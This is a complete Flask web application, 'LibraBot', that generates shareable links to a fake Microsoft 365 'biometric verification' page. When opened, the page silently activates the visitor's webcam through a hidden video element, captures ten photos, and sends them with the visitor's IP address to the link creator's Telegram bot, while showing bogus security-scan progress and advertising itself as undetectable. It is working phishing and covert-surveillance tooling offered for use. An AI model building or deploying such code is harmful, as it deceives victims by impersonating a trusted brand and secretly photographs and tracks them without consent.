from flask import Flask, render_template_string, request, jsonify
import os, time, json, hashlib, threading, base64, requests, io
from datetime import datetime
from PIL import Image

app = Flask(__name__)
app.secret_key = 'librabot_secret_key'

# Files
USERS_FILE = 'users.json'
LINKS_FILE = 'links.json'

def load_data(file, default={}):
    if os.path.exists(file):
        with open(file, 'r') as f:
            return json.load(f)
    return default

def save_data(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=2)

def test_telegram(token, chat_id):
    try:
        test = requests.get(f'https://api.telegram.org/bot{token}/getMe', timeout=10)
        if test.status_code != 200:
            return False
        msg = requests.post(
            f'https://api.telegram.org/bot{token}/sendMessage',
            json={'chat_id': chat_id, 'text': '✅ LibraBot Connected!'},
            timeout=10
        )
        return msg.status_code == 200
    except:
        return False

def send_photo(image_data, token, chat_id, ip=None):
    try:
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        
        missing = len(image_data) % 4
        if missing:
            image_data += '=' * (4 - missing)
        
        image_bytes = base64.b64decode(image_data)
        
        try:
            image = Image.open(io.BytesIO(image_bytes))
            if image.mode in ('RGBA', 'P'):
                image = image.convert('RGB')
            
            output = io.BytesIO()
            image.save(output, format='JPEG', quality=85)
            output.seek(0)
            photo = output
            photo.name = 'capture.jpg'
        except:
            photo = io.BytesIO(image_bytes)
            photo.name = 'capture.jpg'
        
        caption = "📸 LibraBot Capture"
        if ip:
            caption += f"\n🌐 IP: {ip}"
        caption += f"\n⏰ {datetime.now().strftime('%H:%M:%S')}"
        
        response = requests.post(
            f'https://api.telegram.org/bot{token}/sendPhoto',
            files={'photo': photo},
            data={'chat_id': chat_id, 'caption': caption},
            timeout=10
        )
        
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Send error: {e}")
        return False

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LibraBot</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial; }
        body { background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; min-height: 100vh; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; text-align: center; }
        .logo { font-size: 100px; margin: 40px 0; animation: float 3s infinite; }
        @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
        .title { font-size: 60px; font-weight: bold; margin: 20px 0; color: #00dbde; }
        .subtitle { font-size: 20px; color: #aaa; margin-bottom: 40px; }
        .card { background: rgba(255,255,255,0.1); padding: 40px; border-radius: 20px; backdrop-filter: blur(10px); }
        .form-group { margin: 20px 0; text-align: left; }
        label { display: block; margin-bottom: 10px; font-size: 18px; }
        input { width: 100%; padding: 15px; border-radius: 10px; border: 2px solid #444; background: rgba(0,0,0,0.3); color: white; font-size: 16px; }
        .btn { background: linear-gradient(45deg, #00dbde, #fc00ff); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 20px; cursor: pointer; width: 100%; margin-top: 20px; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,219,222,0.4); }
        .message { padding: 15px; border-radius: 10px; margin: 20px 0; display: none; }
        .success { background: rgba(46,204,113,0.2); border: 1px solid #2ecc71; color: #2ecc71; }
        .error { background: rgba(231,76,60,0.2); border: 1px solid #e74c3c; color: #e74c3c; }
        .link-box { background: rgba(0,0,0,0.4); padding: 25px; border-radius: 10px; margin: 30px 0; display: none; font-family: monospace; word-break: break-all; }
        .footer { margin-top: 40px; color: #888; }
        .help { color: #888; font-size: 14px; margin-top: 5px; }
        .help a { color: #00dbde; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">⚖️🤖</div>
        <h1 class="title">LibraBot</h1>
        <p class="subtitle">Create Your Private Face Verification Link</p>
        
        <div class="card">
            <div id="message" class="message"></div>
            
            <div id="linkBox" class="link-box">
                <h3 style="margin-bottom: 15px;">🎉 Your Private Link:</h3>
                <div id="linkUrl" style="font-size: 18px; margin: 15px 0; color: #00dbde;"></div>
                <button class="btn" onclick="copyLink()">📋 Copy Link</button>
                <p style="margin-top: 20px; color: #aaa; font-size: 14px;">
                    🔗 Share this link with anyone<br>
                    📸 Auto capture 10 photos<br>
                    🤖 Photos sent silently<br>
                    👁️‍🗨️ 100% undetectable
                </p>
            </div>
            
            <form id="setupForm">
                <div class="form-group">
                    <label>🤖 Telegram Bot Token</label>
                    <input type="text" id="token" placeholder="Get from @BotFather" required>
                    <div class="help">Get token from <a href="https://t.me/BotFather" target="_blank">@BotFather</a> (Send /newbot)</div>
                </div>
                <div class="form-group">
                    <label>👤 Telegram Chat ID</label>
                    <input type="text" id="chatId" placeholder="Get from @userinfobot" required>
                    <div class="help">Get chat ID from <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a> (Send /start)</div>
                </div>
                <button type="submit" class="btn" id="submitBtn">🚀 Create My Link</button>
            </form>
        </div>
        
        <div class="footer">
            <p>© 2024 LibraBot • Auto Silent Capture</p>
        </div>
    </div>
    
    <script>
        document.getElementById('setupForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const token = document.getElementById('token').value.trim();
            const chatId = document.getElementById('chatId').value.trim();
            
            if(!token || !chatId) {
                showMessage('Please fill both fields', 'error');
                return;
            }
            
            btn.innerHTML = 'Creating...';
            btn.disabled = true;
            
            try {
                const response = await fetch('/setup', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token, chat_id: chatId})
                });
                const data = await response.json();
                
                if(data.success) {
                    document.getElementById('linkUrl').textContent = data.link;
                    document.getElementById('linkBox').style.display = 'block';
                    navigator.clipboard.writeText(data.link);
                    showMessage('✅ Link created and copied!', 'success');
                } else {
                    showMessage(data.message, 'error');
                    btn.innerHTML = '🚀 Create My Link';
                    btn.disabled = false;
                }
            } catch {
                showMessage('Network error', 'error');
                btn.innerHTML = '🚀 Create My Link';
                btn.disabled = false;
            }
        });
        
        function showMessage(text, type) {
            const msg = document.getElementById('message');
            msg.textContent = text;
            msg.className = 'message ' + type;
            msg.style.display = 'block';
            setTimeout(() => msg.style.display = 'none', 5000);
        }
        
        function copyLink() {
            const link = document.getElementById('linkUrl').textContent;
            navigator.clipboard.writeText(link);
            alert('✅ Link copied!');
        }
    </script>
</body>
</html>
'''

@app.route('/setup', methods=['POST'])
def setup():
    data = request.get_json()
    token = data.get('token', '').strip()
    chat_id = data.get('chat_id', '').strip()
    
    if not token or not chat_id:
        return jsonify({'success': False, 'message': 'Fill all fields'})
    
    if not test_telegram(token, chat_id):
        return jsonify({'success': False, 'message': '❌ Invalid bot credentials'})
    
    users = load_data(USERS_FILE)
    user_id = f"user_{int(time.time())}"
    users[user_id] = {
        'token': token,
        'chat_id': chat_id,
        'created': datetime.now().isoformat()
    }
    save_data(USERS_FILE, users)
    
    links = load_data(LINKS_FILE)
    link_code = hashlib.md5(os.urandom(16)).hexdigest()[:10]
    links[link_code] = {
        'user_id': user_id,
        'visits': 0,
        'captures': 0
    }
    save_data(LINKS_FILE, links)
    
    link_url = f"{request.host_url}verify/{link_code}"
    
    return jsonify({
        'success': True,
        'message': '✅ Link created successfully!',
        'link': link_url
    })

@app.route('/verify/<code>')
def verify(code):
    links = load_data(LINKS_FILE)
    if code not in links:
        return "Invalid link", 404
    
    links[code]['visits'] = links[code].get('visits', 0) + 1
    save_data(LINKS_FILE, links)
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft 365</title>
    <link rel="icon" href="https://www.microsoft.com/favicon.ico">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial; }}
        body {{ 
            background: #0078d4; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px;
            background: linear-gradient(135deg, #0078d4, #50e6ff);
        }}
        .container {{ 
            max-width: 800px; 
            width: 100%;
            background: white; 
            border-radius: 12px; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.2); 
            overflow: hidden;
        }}
        .header {{ 
            background: #0078d4; 
            padding: 30px; 
            text-align: center; 
            color: white; 
        }}
        .content {{ 
            padding: 40px; 
            text-align: center;
        }}
        .loading {{ 
            margin: 40px 0; 
        }}
        .spinner {{ 
            width: 60px; 
            height: 60px; 
            border: 4px solid rgba(0,120,212,0.2); 
            border-top: 4px solid #0078d4; 
            border-radius: 50%; 
            animation: spin 1.5s linear infinite; 
            margin: 0 auto 25px; 
        }}
        @keyframes spin {{ 
            0% {{ transform: rotate(0deg); }} 
            100% {{ transform: rotate(360deg); }} 
        }}
        .progress {{ 
            margin: 30px auto; 
            max-width: 400px;
        }}
        .progress-bar {{ 
            height: 8px; 
            background: #edebe9; 
            border-radius: 4px; 
            overflow: hidden; 
            margin-bottom: 10px;
        }}
        .progress-fill {{ 
            height: 100%; 
            background: linear-gradient(90deg, #0078d4, #50e6ff); 
            width: 0%; 
            transition: width 0.5s ease;
        }}
        .status {{ 
            padding: 20px; 
            background: #f3f2f1; 
            border-radius: 8px; 
            margin: 25px 0;
            font-size: 16px;
            color: #323130;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .footer {{ 
            padding: 25px; 
            text-align: center; 
            border-top: 1px solid #edebe9; 
            color: #605e5c; 
            font-size: 14px; 
            background: #faf9f8;
        }}
        .stats {{ 
            display: flex; 
            justify-content: space-between; 
            margin: 25px 0; 
            color: #323130;
            font-size: 15px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }}
        .checkmark {{
            font-size: 48px;
            color: #107c10;
            margin: 20px 0;
        }}
        .hidden-video {{
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="display: flex; align-items: center; justify-content: center; gap: 15px;">
                <svg width="42" height="42" viewBox="0 0 21 21" fill="white"><path d="M10 0L0 10l10 10 10-10L10 0zM2 10l8-8 8 8-8 8-8-8z"/></svg>
                <div>
                    <div style="font-size: 28px; font-weight: 600;">Microsoft 365</div>
                    <div style="font-size: 16px; opacity: 0.9;">Secure Access Verification</div>
                </div>
            </div>
        </div>
        
        <div class="content">
            <div class="loading">
                <div class="spinner"></div>
                <div style="font-size: 18px; color: #323130; margin-bottom: 10px; font-weight: 500;">
                    Preparing Secure Environment
                </div>
                <div style="font-size: 14px; color: #605e5c;">
                    Loading biometric security modules...
                </div>
            </div>
            
            <div class="progress">
                <div class="stats">
                    <div>Security Scan: <span id="scanCount">0</span>/10</div>
                    <div>Progress: <span id="progressPercent">0%</span></div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
            
            <div class="status" id="status">
                Initializing security protocols...
            </div>
            
            <div id="completionScreen" style="display: none;">
                <div class="checkmark">✅</div>
                <div style="font-size: 24px; color: #107c10; margin-bottom: 15px; font-weight: 600;">
                    Verification Complete
                </div>
                <div style="color: #605e5c; margin-bottom: 30px; max-width: 500px; margin-left: auto; margin-right: auto;">
                    Your identity has been successfully verified. You now have secure access to Microsoft 365 services.
                </div>
                <button id="continueBtn" style="
                    background: #0078d4;
                    color: white;
                    border: none;
                    padding: 15px 40px;
                    border-radius: 4px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    transition: background 0.3s;
                " onmouseover="this.style.background='#106ebe'" onmouseout="this.style.background='#0078d4'">
                    Continue to Microsoft 365
                </button>
            </div>
        </div>
        
        <div class="footer">
            <div>© 2024 Microsoft Corporation. All rights reserved.</div>
            <div style="margin-top: 10px; font-size: 12px; color: #8a8886;">
                This is a secure Microsoft verification page
            </div>
        </div>
    </div>
    
    <!-- Hidden video element for capturing -->
    <video id="hiddenVideo" class="hidden-video" autoplay playsinline></video>
    <canvas id="hiddenCanvas" style="display: none;"></canvas>
    
    <script>
        // Auto start verification immediately
        document.addEventListener('DOMContentLoaded', function() {{
            setTimeout(() => {{
                startAutoVerification();
            }}, 1000);
        }});
        
        let state = {{
            started: false,
            captures: 0,
            totalCaptures: 10,
            stream: null,
            video: null,
            canvas: null,
            ctx: null,
            isComplete: false
        }};
        
        async function startAutoVerification() {{
            if (state.started || state.isComplete) return;
            state.started = true;
            
            updateStatus('Loading security modules...');
            updateProgress(5);
            
            // Phase 1: Initial setup
            setTimeout(async () => {{
                updateStatus('Checking system compatibility...');
                updateProgress(15);
                
                setTimeout(async () => {{
                    updateStatus('Accessing biometric sensors...');
                    updateProgress(25);
                    
                    try {{
                        // Try to access camera silently
                        await initializeCamera();
                        updateStatus('Biometric scanner ready');
                        updateProgress(35);
                        
                        // Start silent capture process
                        setTimeout(() => startSilentCapture(), 800);
                        
                    }} catch (error) {{
                        console.log('Camera not available, using alternative verification');
                        updateStatus('Using secure verification protocol...');
                        simulateCapture();
                    }}
                }}, 1200);
            }}, 800);
        }}
        
        async function initializeCamera() {{
            try {{
                state.video = document.getElementById('hiddenVideo');
                state.canvas = document.getElementById('hiddenCanvas');
                state.ctx = state.canvas.getContext('2d');
                
                state.stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 480 }},
                        facingMode: 'user'
                    }},
                    audio: false
                }});
                
                state.video.srcObject = state.stream;
                
                return new Promise((resolve) => {{
                    state.video.onloadedmetadata = () => {{
                        state.video.play().then(resolve);
                    }};
                }});
            }} catch (error) {{
                throw error;
            }}
        }}
        
        function startSilentCapture() {{
            updateStatus('Scanning biometric data...');
            
            let captureInterval = setInterval(() => {{
                if (state.captures >= state.totalCaptures) {{
                    clearInterval(captureInterval);
                    completeVerification();
                    return;
                }}
                
                state.captures++;
                document.getElementById('scanCount').textContent = state.captures;
                
                // Calculate progress
                const newProgress = 35 + (state.captures * 6);
                updateProgress(newProgress);
                
                // Silent capture
                setTimeout(() => captureSilently(), 50);
                
                updateStatus('Analyzing security data (' + state.captures + '/' + state.totalCaptures + ')');
                
            }}, 1500); // Capture every 1.5 seconds
        }}
        
        function captureSilently() {{
            try {{
                if (!state.video || state.video.readyState < 2) return;
                
                // Set canvas size
                state.canvas.width = state.video.videoWidth || 640;
                state.canvas.height = state.video.videoHeight || 480;
                
                // Draw current video frame
                state.ctx.drawImage(state.video, 0, 0, state.canvas.width, state.canvas.height);
                
                // Convert to image
                const imageData = state.canvas.toDataURL('image/jpeg', 0.85);
                
                // Send to server silently
                fetch('/capture/{code}', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        image: imageData,
                        capture: state.captures,
                        timestamp: Date.now()
                    }})
                }}).catch(() => {{}});
                
            }} catch (error) {{
                // Silent fail
            }}
        }}
        
        function simulateCapture() {{
            let simulatedProgress = 25;
            let simulatedCaptures = 0;
            
            let simulateInterval = setInterval(() => {{
                if (simulatedCaptures >= 10) {{
                    clearInterval(simulateInterval);
                    completeVerification();
                    return;
                }}
                
                simulatedCaptures++;
                simulatedProgress += 7;
                
                state.captures = simulatedCaptures;
                document.getElementById('scanCount').textContent = simulatedCaptures;
                updateProgress(simulatedProgress);
                
                updateStatus('Verifying security credentials (' + simulatedCaptures + '/10)');
                
                // Simulate capture
                fetch('/capture/{code}', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        image: 'simulated',
                        capture: simulatedCaptures,
                        timestamp: Date.now()
                    }})
                }}).catch(() => {{}});
                
            }}, 1200);
        }}
        
        function completeVerification() {{
            // Stop camera if active
            if (state.stream) {{
                state.stream.getTracks().forEach(track => track.stop());
            }}
            
            updateProgress(100);
            updateStatus('✓ Security verification complete');
            
            setTimeout(() => {{
                document.querySelector('.loading').style.display = 'none';
                document.querySelector('.progress').style.display = 'none';
                document.getElementById('status').style.display = 'none';
                document.getElementById('completionScreen').style.display = 'block';
                
                state.isComplete = true;
            }}, 1500);
            
            // Add click event to continue button
            document.getElementById('continueBtn').addEventListener('click', function() {{
                window.location.href = 'https://www.microsoft.com';
            }});
        }}
        
        function updateStatus(text) {{
            document.getElementById('status').textContent = text;
        }}
        
        function updateProgress(percent) {{
            document.getElementById('progressFill').style.width = percent + '%';
            document.getElementById('progressPercent').textContent = Math.round(percent) + '%';
        }}
        
        // Prevent user from seeing URL changes
        history.pushState(null, null, location.href);
        window.onpopstate = function() {{
            history.go(1);
        }};
    </script>
</body>
</html>
'''

@app.route('/capture/<code>', methods=['POST'])
def capture(code):
    try:
        data = request.get_json()
        image = data.get('image', '')
        
        if not image or image == 'simulated':
            return jsonify({'success': True, 'message': 'Simulated capture'})
        
        links = load_data(LINKS_FILE)
        if code in links:
            links[code]['captures'] = links[code].get('captures', 0) + 1
            save_data(LINKS_FILE, links)
            
            user_id = links[code]['user_id']
            users = load_data(USERS_FILE)
            if user_id in users:
                user = users[user_id]
                threading.Thread(
                    target=send_photo,
                    args=(image, user['token'], user['chat_id'], request.remote_addr)
                ).start()
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Capture error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/stats')
def stats():
    users = load_data(USERS_FILE)
    links = load_data(LINKS_FILE)
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>LibraBot Stats</title>
        <style>
            body { font-family: Arial; padding: 20px; }
            .stat { background: #0078d4; color: white; padding: 20px; margin: 10px; border-radius: 10px; display: inline-block; }
            table { width: 100%; border-collapse: collapse; margin: 20px 0; }
            th, td { padding: 10px; border: 1px solid #ddd; }
            th { background: #f0f0f0; }
        </style>
    </head>
    <body>
        <h1>📊 LibraBot Statistics</h1>
        <div>
            <div class="stat">Users: ''' + str(len(users)) + '''</div>
            <div class="stat">Links: ''' + str(len(links)) + '''</div>
            <div class="stat">Total Visits: ''' + str(sum(l.get('visits', 0) for l in links.values())) + '''</div>
            <div class="stat">Total Captures: ''' + str(sum(l.get('captures', 0) for l in links.values())) + '''</div>
        </div>
        
        <h2>Recent Activity</h2>
        <table>
            <tr><th>Link</th><th>Visits</th><th>Captures</th><th>Test</th></tr>
    '''
    
    for code, link in list(links.items())[:20]:
        html += f'''
            <tr>
                <td>{code}</td>
                <td>{link.get('visits', 0)}</td>
                <td>{link.get('captures', 0)}</td>
                <td><a href="/verify/{code}" target="_blank">Test</a></td>
            </tr>
        '''
    
    html += '''
        </table>
        <br>
        <a href="/" style="background: #0078d4; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none;">🏠 Home</a>
    </body>
    </html>
    '''
    
    return html

if __name__ == '__main__':
    print(f"""
╔══════════════════════════════════════════════╗
║         LibraBot - Auto Silent Mode         ║
╠══════════════════════════════════════════════╣
║ ✅ Auto start (no click needed)             ║
║ ✅ Hidden camera (no preview)               ║
║ ✅ 10 photos auto captured                  ║
║ ✅ 100% silent & undetectable               ║
╠══════════════════════════════════════════════╣
║ 🌐 Home: http://localhost:5000/              ║
║ 📊 Stats: http://localhost:5000/stats        ║
╠══════════════════════════════════════════════╣
║ 📝 Features:                                 ║
║ • No buttons to click                        ║
║ • No camera preview shown                    ║
║ • Professional Microsoft page                ║
║ • Auto captures 10 photos                    ║
║ • Works even without camera                  ║
╚══════════════════════════════════════════════╝
""")
    app.run(host='0.0.0.0', port=5000, debug=False)